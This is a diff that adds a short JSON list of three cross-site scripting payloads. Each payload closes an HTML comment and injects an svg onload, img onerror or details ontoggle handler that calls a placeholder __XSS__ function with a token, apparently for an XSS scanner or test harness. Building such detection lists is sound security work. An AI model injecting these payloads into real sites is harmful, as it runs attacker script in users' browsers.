@@ -1,0 +1,5 @@
+[
+  "--><svg onload=__XSS__('{{TOKEN}}')><!--",
+  "--><img src=x onerror=__XSS__('{{TOKEN}}')><!--",
+  "--><details open ontoggle=__XSS__('{{TOKEN}}')><!--"
+]
